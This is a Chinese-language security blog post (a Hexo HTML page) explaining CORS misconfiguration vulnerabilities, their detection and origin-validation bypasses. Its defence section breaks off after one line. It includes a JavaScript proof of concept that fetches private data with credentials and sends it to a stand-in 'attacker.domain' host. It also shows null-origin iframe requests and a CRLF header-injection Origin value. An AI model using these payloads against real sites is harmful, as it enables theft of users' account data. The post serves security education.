@@ -1,0 +1,779 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"comosk.github.io","root":"/","scheme":"Pisces","version":"7.7.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="跨域资源共享（Cross-Originn Resource Sharing）主要是用来解决浏览器跨域网络资源访问。Web应用程序在请求与自己的源不同源（域、协议或端口）资源时执行跨源HTTP请求。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="漏洞名称：CORS跨域共享设置不严">
+<meta property="og:url" content="https://comosk.github.io/2020/02/28/%E6%BC%8F%E6%B4%9E%E5%90%8D%E7%A7%B0%EF%BC%9ACORS%E8%B7%A8%E5%9F%9F%E5%85%B1%E4%BA%AB%E8%AE%BE%E7%BD%AE%E4%B8%8D%E4%B8%A5/index.html">
+<meta property="og:site_name" content="oneNote">
+<meta property="og:description" content="跨域资源共享（Cross-Originn Resource Sharing）主要是用来解决浏览器跨域网络资源访问。Web应用程序在请求与自己的源不同源（域、协议或端口）资源时执行跨源HTTP请求。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://www.jianjunchen.com/img/blog/2018/SOP-network.png">
+<meta property="og:image" content="c:%5CUsers%5CCardo.li%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20191203151334497.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180916151629-6e31ff96-b980-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180916151629-6e7026a4-b980-1.png">
+<meta property="article:published_time" content="2020-02-28T13:41:52.000Z">
+<meta property="article:modified_time" content="2020-02-28T13:45:44.741Z">
+<meta property="article:author" content="л">
+<meta property="article:tag" content="不安全的设置">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://www.jianjunchen.com/img/blog/2018/SOP-network.png">
+
+<link rel="canonical" href="https://comosk.github.io/2020/02/28/%E6%BC%8F%E6%B4%9E%E5%90%8D%E7%A7%B0%EF%BC%9ACORS%E8%B7%A8%E5%9F%9F%E5%85%B1%E4%BA%AB%E8%AE%BE%E7%BD%AE%E4%B8%8D%E4%B8%A5/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true
+  };
+</script>
+
+  <title>漏洞名称：CORS跨域共享设置不严 | oneNote</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="oneNote" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">oneNote</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+        <p class="site-subtitle">山河远阔 清风徐来</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签<span class="badge">10</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类<span class="badge">3</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档<span class="badge">26</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://comosk.github.io/2020/02/28/%E6%BC%8F%E6%B4%9E%E5%90%8D%E7%A7%B0%EF%BC%9ACORS%E8%B7%A8%E5%9F%9F%E5%85%B1%E4%BA%AB%E8%AE%BE%E7%BD%AE%E4%B8%8D%E4%B8%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/header.jpg">
+      <meta itemprop="name" content="л">
+      <meta itemprop="description" content="Find the bug of the world">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="oneNote">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          漏洞名称：CORS跨域共享设置不严
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-02-28 21:41:52 / 修改时间：21:45:44" itemprop="dateCreated datePublished" datetime="2020-02-28T21:41:52+08:00">2020-02-28</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Web安全</span></a>
+                </span>
+            </span>
+
+          
+            <div class="post-description">跨域资源共享（Cross-Originn Resource Sharing）主要是用来解决浏览器跨域网络资源访问。Web应用程序在请求与自己的源不同源（域、协议或端口）资源时执行跨源HTTP请求。</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>严重性：Medium</p>
+<p>漏洞类型：不安全的配置</p>
+<p>安全要求：使用扫描器或人工测试</p>
+<h3 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h3><p>跨域资源共享（Cross-Originn Resource Sharing）主要是用来解决浏览器跨域网络资源访问。Web应用程序在请求与自己的源不同源（域、协议或端口）资源时执行跨源HTTP请求。</p>
+<h3 id="0x01-SOP（Same-Origin-Policy，同源策略）-amp-CORS"><a href="#0x01-SOP（Same-Origin-Policy，同源策略）-amp-CORS" class="headerlink" title="0x01 SOP（Same Origin Policy，同源策略）&amp;CORS"></a>0x01 <strong>SOP（Same Origin Policy，同源策略）&amp;CORS</strong></h3><p>SOP广泛依赖http cookie来维护用户权限，服务端会根据cookie来判断客户端是否合法，能否可以发送机密信息</p>
+<p>同源定义：</p>
+<ul>
+<li>域名</li>
+<li>协议</li>
+<li>tcp端口号</li>
+</ul>
+<p>只要以上三个值是一致的，我们就认为两个资源是同源的。</p>
+<p><img src="https://www.jianjunchen.com/img/blog/2018/SOP-network.png" alt="âåæºç­ç¥âçå¾çæç´¢ç»æ"> </p>
+<p>如图所示a.com网站脚本可以向b.com服务器发送GET请求，但浏览器的SOP会阻止其读取响应内容。</p>
+<p>CORS可以放宽浏览器的同源策略，可以通过浏览器让不同的网站和不同的服务器之间通信。</p>
+<p>CORS的标准定义是：通过设置http头部字段，让客户端有资格跨域访问资源。通过服务器的验证和授权之后，浏览器有责任支持这些http头部字段并且确保能够正确的施加限制。</p>
+<p>主要头部字段包含：“Access-Contorl-Allow-Origin”</p>
+<figure class="highlight http"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Access-Control-Allow-Origin:http://www.example.com</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>头部字段的”源“可以访客的方式给服务端发送跨域请求并且可以读取返回的响应，这种方式就是同源策略所阻止的。默认情况下此请求不会携带Cookie或者其他凭证，因此不能窃听用户的敏感数据，但服务器可以使用配置</p>
+<p>”Access-Control-Allow-Credentials:true”来启用凭证的传输。</p>
+<p>如果允许多个源进行跨域请求，那么当前只能用通配符进行设置：</p>
+<figure class="highlight http"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Access-Control-Allow-Origin</span>: *</span><br></pre></td></tr></tbody></table></figure>
+
+<p>如果使用通配符进行设置后，就不能使用携带凭证的设置，因为CORS规范中规定使用使用携带凭证的请求时，必须指定域名，而不能使用通配符。这种限制能够很好的保护用户的凭证信息，但是却可能在下面三种情况下产生问题，从而造成凭证的泄露。</p>
+<ul>
+<li><p>许多服务器根据用户提供的值生成Access-Control-Allow-Origin标头，但是却不会对Origin值进行校验或者校验不严格。如example.com信任以example.com结尾的任何Origin头，此时可以构造hackerexample.com的Origin头。对于包含“Access-Control-* ”的响应，未声明源，那么服务器很有可能根据用户输入生成相关的头信息。如上示例产生的CORS响应头为：</p>
+<figure class="highlight http"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Access-Control-Allow-Origin</span>: http://hackerexample.com</span><br><span class="line"><span class="attribute">Access-Control-Allow-Credentials</span>: true</span><br></pre></td></tr></tbody></table></figure>
+</li>
+<li><p>有些服务器会接收Origin: null的跨域请求，产生如下的响应信息</p>
+<figure class="highlight http"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Access-Control-Allow-Origin</span>: null</span><br><span class="line"><span class="attribute">Access-Control-Allow-Credentials</span>: true</span><br></pre></td></tr></tbody></table></figure>
+
+<p>此时可以借助iframe构造Origin为null的跨域请求，示例如下：</p>
+<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe sandbox= <span class="string">"allow-scripts allow-top-navigation allow-forms"</span></span><br><span class="line">	 src=<span class="string">'data:text/html,	</span></span><br><span class="line"><span class="string">	 &lt;script&gt;</span></span><br><span class="line"><span class="string"> 			   var xmlhttp=new XMLHttpRequest();</span></span><br><span class="line"><span class="string"> 	           var url="http://wxample.com";</span></span><br><span class="line"><span class="string"> 	           xmlhttp.open("GET",url,true);</span></span><br><span class="line"><span class="string"> 	           xmlhttp.send(null);</span></span><br><span class="line"><span class="string"> 		&lt;/script&gt;'</span></span><br><span class="line">&lt;<span class="regexp">/iframe&gt;</span></span><br></pre></td></tr></tbody></table></figure>
+</li>
+<li><p>有些服务器同时接收HTTP和HTTPS请求，可以在HTTPS页面下进行同源或跨域请求，打破HTTPS的安全防护进行中间人攻击，但是在有些浏览器中则不允许HTTPS跨域访问HTTP，如Chrome、Firefox.</p>
+</li>
+</ul>
+<h3 id="0x02-泄露用户数据"><a href="#0x02-泄露用户数据" class="headerlink" title="0x02 泄露用户数据"></a>0x02 泄露用户数据</h3><p>当“Access-Control-Allow-Credntials” 设置成true时，利用CORS配置漏洞的攻击就是创建一个JavaScrpt脚本去发送CORS请求，如下：</p>
+<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> req=<span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">req.onload=reqListener;</span><br><span class="line">req.open(<span class="string">"get"</span>, <span class="attr">https</span>:<span class="comment">//vulnerable.domain/api/private-data",true);</span></span><br><span class="line">req.withCredentials=<span class="literal">true</span>;</span><br><span class="line">req.send();</span><br><span class="line"><span class="function"><span class="keyword">function</span>  <span class="title">reqListener</span>(<span class="params"></span>)</span>{</span><br><span class="line">    location=<span class="string">"//attacker.domain/log?response="</span>+<span class="keyword">this</span>.responseText;</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure>
+
+<!--注：XMLHttpRequest()对象发送HTTP请求可以实现网站与服务器之间进行数据交互，可以从URL中获取数据，无需刷新整个页面数据，XMLhttpRequset可以获得任何类型的数据。-->
+
+<!--XMLHttpRequest.open() 初始化一个请求。该方法只能在javascript代码中使用。-->
+
+<!--XMLHttpRequest.withCredentials 一个布尔值，用来指定跨域Access-Control请求是否带有授权信息。如cookie或授权header头。-->
+
+<!--XMLHttpRequest.send() 发送请求。如果请求是异步的，那么该方法将在请求发送后立即返回。XMLHttpRequest请求的类型取决于open()第三个参数async的值，false则是同步模式，true为异步模式-->
+
+<p>当带有目标系统用户凭证的受害者访问带有上述代码的页面时，浏览器就会发送下面的请求到有漏洞的服务器上。</p>
+<figure class="highlight"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Get /api/private-data HTTP/1.1</span><br><span class="line">Host： vulnerable.domain</span><br><span class="line">Origin： https://attacker.domain/</span><br><span class="line">Cookie:JSESSION=&lt;redacted&gt;</span><br></pre></td></tr></tbody></table></figure>
+
+<p>接收到响应如下：</p>
+<figure class="highlight"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span>: Apache-Coyote/1.1</span><br><span class="line"><span class="attribute">Access-Control-Allow-Origin</span>: https://attacker.domain</span><br><span class="line"><span class="attribute">Access-Control-Allow-Credentials</span>: true</span><br><span class="line"><span class="attribute">Access-Control-Expose-Headers</span>: Access-Control-Allow-Origin,Access-Control-Allow-Credentials</span><br><span class="line"><span class="attribute">Vary</span>: Origin</span><br><span class="line"><span class="attribute">Expires</span>: Thu, 01 Jan 1970 12:00:00 GMT</span><br><span class="line"><span class="attribute">Last-Modified</span>: Wed, 02 May 2018 09:07:07 GMT</span><br><span class="line"><span class="attribute">Cache-Control</span>: no-store, no-cache, must-revalidate, max-age=0, post-check=0, pre-check=0</span><br><span class="line"><span class="attribute">Pragma</span>: no-cache</span><br><span class="line"><span class="attribute">Content-Type</span>: application/json;charset=ISO-8859-1</span><br><span class="line"><span class="attribute">Date</span>: Wed, 02 May 2018 09:07:07 GMT</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Length</span>: 149</span><br><span class="line">{"id":1234567,"name":"Name","surname":"Surname","email":"email@target.local","account":"ACT1234567","balance":"123456,7","token":"top-secret-string"}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>服务器发送了头部字段”Access-Control-Allow-*”给客户端，所以受受害者浏览器允许包含恶意JavaSript代码的页面访问用户的隐私数据。</p>
+<h3 id="0x03-CORS错误配置"><a href="#0x03-CORS错误配置" class="headerlink" title="0x03 CORS错误配置"></a>0x03 CORS错误配置</h3><ul>
+<li><p><strong>反射Origin头</strong></p>
+<p>Access-Control-Allow-Origin只能配置单个Origin，null或*</p>
+</li>
+<li><p><strong>Origin校验错误</strong></p>
+<ol>
+<li>前缀匹配</li>
+<li>后缀匹配</li>
+<li>没有转义‘.’</li>
+<li>包含匹配</li>
+</ol>
+</li>
+<li><p><strong>信任null</strong></p>
+<p>有些开发者在网站上配置信任null，用于与本地file页面共享数据，如下所示：</p>
+<figure class="highlight http"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Access-Control-Allow-Origin</span>: null</span><br><span class="line"><span class="attribute">Access-Control-Allow-Credentials</span>: true</span><br></pre></td></tr></tbody></table></figure>
+
+<p>这种相当于无SOP保护</p>
+</li>
+<li><p><strong>HTTPS域信任HTTP域</strong></p>
+<p>如果HTTPS网站配置了CORS且信任HTTP域，就可以通过攻击者劫持信任HTTP域，然后通过这个HTTP域发送域请求中到HTTPS网站，直接阅读HTTPS下受保护的内容。</p>
+<p><img src="C:%5CUsers%5CCardo.li%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20191203151334497.png" alt="image-20191203151334497"></p>
+<p>利用CORS误配置实现中间人读取HTTPS网站内容</p>
+</li>
+<li><p><strong>信任自身全部子域</strong></p>
+<p>导致子域的XSS危害被强化。为了防止某个子域上XSS漏洞危害到其他子域，浏览器设计了Cookie的httponly标志，用于限制Javascript读取Cookie，因此某个子域XSS不能读取带有HttpOnly标志的Cookie，难以窃取其他重要子域上的敏感内容。但是如果这个域配置了CORS且信任全部子域，那么攻击者可以利用其他任意子域上XSS漏洞，发送跨域请求到目标重要域网站，从而获取敏感内容。</p>
+</li>
+<li><p><strong>Origin*与Credentials：true 共用</strong></p>
+</li>
+<li><p><strong>缺少Vary:Origin头</strong></p>
+<p>资源服务器共享多个域名，需要对每个请求域的跨域请求生成不同的访问控制策略，资源内容需要缓存。Vary：Origin的作用就是让同一个URL有多份缓存。例如：c.com同时允许a.com和b.com共享。c.com资源内容首先被a.com脚本跨域访问后被缓存，其中缓存的响应头应该是Access-Control-Allow-Origin：<a href="http://a.com。此时b.com脚本就不能读取缓存响应内容，因为缓存响应头是允许a.com共享，而不是b.com。" target="_blank" rel="noopener">http://a.com。此时b.com脚本就不能读取缓存响应内容，因为缓存响应头是允许a.com共享，而不是b.com。</a></p>
+<p>如果是写死地Access-control-Allow-Origin，一定不要加Vary：Origin。如果是根据Origin动态的计算出Access-Control-Allow-Origin,那么要一定始终加上Vary:Origin，即便没有Origin请求头的情况下。</p>
+<h3 id="0x04-检测方法"><a href="#0x04-检测方法" class="headerlink" title="0x04 检测方法"></a>0x04 检测方法</h3><h4 id="4-1-三步测试CORS错误配置"><a href="#4-1-三步测试CORS错误配置" class="headerlink" title="4.1 三步测试CORS错误配置"></a>4.1 <strong>三步测试CORS错误配置</strong></h4><ol>
+<li>识别</li>
+<li>分析</li>
+<li>利用</li>
+</ol>
+<ul>
+<li><p><strong>识别</strong></p>
+<p>开启CORS，尝试使用不同的值，例null或者不同的域名（最好利用脚本自动化实现）</p>
+</li>
+<li><p><strong>分析</strong></p>
+<p>fuzzing请求包头中的Origin字段，分析返回的报文，查看哪些域是被允许的。哪些类型控件可以被控制，应用会返回哪种头部字段</p>
+</li>
+<li><p><strong>利用</strong></p>
+<p>如果利用配置错误的CORS应用，若Access-Control-Allow-Credentials未开启，需要其他条件去利用这个问题</p>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="4-2-存在Access-Control-Allow-Credentials：true时，基于CORS配置的可用性"><a href="#4-2-存在Access-Control-Allow-Credentials：true时，基于CORS配置的可用性" class="headerlink" title="4.2 存在Access-Control-Allow-Credentials：true时，基于CORS配置的可用性"></a>4.2 <strong>存在Access-Control-Allow-Credentials：true时，基于CORS配置的可用性</strong></h4><table>
+<thead>
+<tr>
+<th>Origin</th>
+<th>Access-Control-Allow-Credentials</th>
+<th>是否可利用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><a href="https://attacker.com" target="_blank" rel="noopener">https://attacker.com</a></td>
+<td>true</td>
+<td>yes</td>
+</tr>
+<tr>
+<td>null</td>
+<td>true</td>
+<td>yes</td>
+</tr>
+<tr>
+<td>*</td>
+<td>true</td>
+<td>yes</td>
+</tr>
+</tbody></table>
+<p>  泄露用户数据见：0x02泄露用户隐私数据</p>
+<h4 id="4-3服务器端缓存中毒"><a href="#4-3服务器端缓存中毒" class="headerlink" title="4.3服务器端缓存中毒"></a>4.3<strong>服务器端缓存中毒</strong></h4><p>  一种潜在的攻击方式利用CORS的错误配置注入HTTP头部，可能会被服务器端缓存下，例如制作存储型XSS</p>
+<p>  攻击的利用条件：</p>
+<ul>
+<li><p>存在服务器缓存</p>
+</li>
+<li><p>能够反射Origin头部</p>
+</li>
+<li><p>不会检查“Origin”头部的特殊字符，比如“\r”</p>
+<p>利用上述先决条件，就可以攻击（IE/EDGE浏览器）利用http头部注入的利用方式，因在使用”\r”（0x0d）作为HTTP头部字段的终结者</p>
+<p>请求：</p>
+</li>
+</ul>
+<figure class="highlight"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP1.1</span><br><span class="line">Origin：z[0x0d]Content-Type:text/html; charset=UTF-7</span><br></pre></td></tr></tbody></table></figure>
+
+<p>  IE处理后返回报文</p>
+<figure class="highlight"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">200</span> ok</span><br><span class="line"><span class="attribute">Access-Control-Allow-Origin:z</span></span><br><span class="line">Content-Type:text/html;charset=UTF-7</span><br></pre></td></tr></tbody></table></figure>
+
+<p>  上面攻击方式不能直接利用，因为攻击者无法保证受害者浏览器会提前发送畸形的头部。</p>
+<p>  如果攻击者能够提前发送畸形的“Origin”头部，比如利用代理或者命令行的方式发送，然后服务器就会缓存这样的返回报文并且也会传递给其他人。</p>
+<p>  上面得例子就可以让攻击者把攻击的页面编码变成UTF-7，这样就可能会引发XSS漏洞</p>
+<h4 id="4-4-绕过技术"><a href="#4-4-绕过技术" class="headerlink" title="4.4 绕过技术"></a>4.4 <strong>绕过技术</strong></h4><p>  有时需要信任不同的域或者所有的子域，开发者会利用正则表达式或者其它的方式去验证有效性。</p>
+<p>  下面利用一部分源来绕过某些验证技术，已验证有效性</p>
+<ul>
+<li><p>NULL源</p>
+<p>CORS规范中提及NULL源，触发这个源是为了网页跳转或者来自本地HTML文件</p>
+<p>目标应用可能会接受“NULL”源，并且这个可能被测试者（或者攻击者）利用，很容易使用沙盒iframe来获取NULL源</p>
+<figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">sandbox</span>=<span class="string">"allow-scripts allow-top-navigation allow-forms"</span> <span class="attr">src</span>=<span class="string">'data:text/html,&lt;script&gt;**CORS request here**&lt;/script&gt;'</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>注：带有额外限制的iframe标签，sandbox属性值可以是空的字符串，也可使空格分割的预定义值列表。</p>
+<p>allow-top-navigation  允许 iframe 内容从包含文档导航（加载）内容 </p>
+<p>allow-forms               允许表单提交</p>
+<p>allow-scripts              允许脚本执行</p>
+</li>
+</ul>
+<p>  使用上述的iframe产生的请求类似于下面这样</p>
+  <figure class="highlight"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /handler</span><br><span class="line"><span class="attribute">Host</span>: target.loacl</span><br><span class="line">  Origin:null</span><br></pre></td></tr></tbody></table></figure>
+
+<p>  如果目标应用接受”null“源，那么服务器将返回类似下面的数据报文</p>
+<figure class="highlight http"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">200</span> ok</span><br><span class="line"><span class="attribute">Access-Control-Allow-Origin:null</span></span><br><span class="line"><span class="attribute">Access-Control-Allow-Credentials:true</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>  此类错误配置很常见，所以会很方便的去尝试</p>
+<ul>
+<li><p><strong>使用目标域名作为子域名</strong></p>
+<p>如果目标只检查Origin中的字符串是否包含“target.local”,那么就可以在自己控制的服务器上创建一个子域名。</p>
+<p>用这样的方式，请求一般产生于JavaScript代码，并且请求中的Origin回像下面这样</p>
+<figure class="highlight http"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Origin:https://target.local.attacker.domain</span></span><br></pre></td></tr></tbody></table></figure>
+</li>
+<li><p><strong>注册一个同名的域名</strong></p>
+<p>假设目标应用是使用基于下面的正则表达式去检测“Origin”头部的话：</p>
+<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^https?:\/\/.*\.?target\.local$</span><br></pre></td></tr></tbody></table></figure>
+
+<p>这样的正则表达式包含着一个问题，就是导致这样的CORS配置容易收到被攻击。下面分解正则表达式。</p>
+<table>
+<thead>
+<tr>
+<th>Part</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>.*</td>
+<td>除了终止符的任何字符</td>
+</tr>
+<tr>
+<td>\ .</td>
+<td>一个点</td>
+</tr>
+<tr>
+<td>?</td>
+<td>此处匹配一个“.”一次或者零次</td>
+</tr>
+</tbody></table>
+<p>这个？只影响”.“这个字符串，因此”target.local“前面的任何字符串都是被允许的，而不管是否有”.”把他们隔开。因此只要在”Origin“末尾包含目标域名就可以绕过上面的限制，例目标域名target.local</p>
+<figure class="highlight http"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Origin：https://nottarget.local</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>攻击者只需要注册一个尾部包含目标域名的新域名就可以利用这样的漏洞了。</p>
+</li>
+<li><p><strong>控制目标的子域名</strong></p>
+<p>现在目标应用实现是基于下面的正则表达式去检测”Origin”头部的话：</p>
+<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^https?:\ / \ /(.*\ .)?target\ .local$</span><br></pre></td></tr></tbody></table></figure>
+
+<p>这个允许来自target.local跨域访问，并且包含所有的子域名（来自HTTP协议或HTTPS协议）</p>
+<p>这个场景下，如果攻击者可以控制目标的有效的子域名（例domain.target.local”),如果能够接管一个子域名，或者找到一个有XSS漏洞的子域名。攻击者就可以产生一个有效的CORS请求。</p>
+</li>
+</ul>
+<h3 id="0x05-安全防御措施"><a href="#0x05-安全防御措施" class="headerlink" title="0x05 安全防御措施"></a>0x05 安全防御措施</h3><p>  对于防范CORS配置错误漏洞的防御从两个方面，一是一般守则，二是配置实施</p>
